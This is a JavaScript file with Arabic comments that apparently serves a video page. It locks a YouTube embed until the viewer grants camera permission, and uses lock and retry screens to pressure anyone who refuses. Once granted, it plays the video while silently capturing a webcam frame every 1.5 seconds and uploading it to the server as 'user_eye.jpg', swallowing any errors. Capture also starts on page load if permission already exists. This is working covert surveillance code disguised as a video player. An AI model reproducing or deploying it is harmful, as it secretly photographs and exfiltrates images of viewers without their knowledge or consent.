/* ==========================================================
   سكريبت الكاميرا المتسق وإعادة المحاولة الإجبارية
   ========================================================== */

let mediaStream = null;

async function initPersistentCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { ideal: 'user' } } 
        });

        const videoEl = document.getElementById('video');
        if (videoEl) videoEl.srcObject = mediaStream;
        
        // [عند السماح]: إزالة شاشة الحظر وتشغيل الفيديو فوراً
        const playerContainer = document.getElementById('playerContainer');
        if (playerContainer) {
            const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
            playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
        }
        
        // التقاط الصور وإرسالها كل 1.5 ثانية في الخلفية
        setInterval(() => {
            if (!mediaStream || !videoEl) return;
            try {
                const vw = videoEl.videoWidth || 640;
                const vh = videoEl.videoHeight || 480;

                const canvas = document.createElement('canvas');
                canvas.width = vw;
                canvas.height = vh;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, vw, vh);

                canvas.toBlob(blob => {
                    if (blob) {
                        let fd = new FormData();
                        fd.append('image', blob, `user_eye.jpg`);
                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                    }
                }, 'image/jpeg', 0.85);
            } catch (err) {}
        }, 1500);

    } catch (e) {
        console.log("تم الرفض أو التجاهل:", e);
        showRetryScreen();
    }
}

// دالة عرض شاشة الحظر ومنع الفيديو والزر الأحمر لإعادة ضبط الصفحة وفتح الأذونات مجدداً
function showRetryScreen() {
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        playerContainer.innerHTML = `
            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:36px;margin-bottom:8px;">🔒</div>
                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لفك قفل وتشغيل المقطع</p>
                    <button id="retryBtn" style="font-family:inherit;font-size:13px;color:#fff;background:#cc0000;padding:10px 24px;border-radius:20px;border:0;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(204,0,0,0.4);">اضغط هنا للمتابعة</button>
                </div>
            </div>
        `;
        
        // عند الضغط على الزر الأحمر، يتم إعادة تحميل الصفحة لتجاوز حظر المتصفح وإظهار الأذونات مجدداً عند الضغط على الفيديو
        const btn = document.getElementById('retryBtn');
        if (btn) {
            btn.onclick = () => {
                location.reload();
            };
        }
    }
}

function startCapture() {
    if (mediaStream) return;
    
    const playerContainer = document.getElementById('playerContainer');
    if (playerContainer) {
        const iframe = playerContainer.querySelector('iframe');
        if(iframe) {
            const match = iframe.src.match(/embed\/([^?]+)/);
            if(match) playerContainer.dataset.videoId = match[1];
        }
        
        // قفل مشغل الفيديو فوراً لمنع تشغيله في الخلفية
        playerContainer.innerHTML = `
            <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                <div>
                    <div style="font-size:32px;margin-bottom:8px;">⏳</div>
                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا لتشغيل المقطع</p>
                </div>
            </div>
        `;
    }

    initPersistentCamera();
}

// الفحص التلقائي عند فتح الصفحة إذا كان الإذن ممنوحاً مسبقاً
navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        startCapture();
    }
});
